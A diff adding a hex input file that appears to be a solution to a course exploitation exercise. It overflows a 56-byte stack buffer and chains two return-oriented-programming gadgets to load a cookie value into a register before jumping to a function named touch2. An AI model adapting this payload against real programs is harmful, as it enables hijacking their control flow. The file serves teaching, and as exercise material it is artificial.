@@ -1,0 +1,14 @@
+                        /*start of buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* overflow 56 bytes buffer */
+
+f9 18 40 00 00 00 00 00 /* popq %rax (gadget)takes nxt value */
+a5 8f 6f 1d 00 00 00 00 /* my $cookie */
+04 19 40 00 00 00 00 00 /* movq %rax, %rdi (gadget) */
+78 17 40 00 00 00 00 00 /* call to touch2 address */
+
